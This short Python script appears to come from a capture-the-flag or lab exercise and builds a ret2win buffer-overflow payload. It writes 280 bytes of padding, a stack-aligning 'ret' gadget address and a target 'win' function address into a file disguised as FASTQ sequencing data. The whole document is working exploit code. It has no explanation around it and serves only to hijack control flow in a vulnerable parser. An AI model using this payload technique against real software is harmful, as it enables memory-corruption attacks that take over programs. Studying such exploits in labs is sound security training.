#!/usr/bin/env python3

"""
Create the payload
"""

WIN = 0x40251d
RET = 0x401016                 # the bare `ret` address you just found
pad = b"A" * 280
seq = pad + RET.to_bytes(8, "little") + WIN.to_bytes(8, "little")
open("inputs/ret2win.fastq", "wb").write(b"@x\n" + seq + b"\n+\n" + b"I"*len(seq) + b"\n")
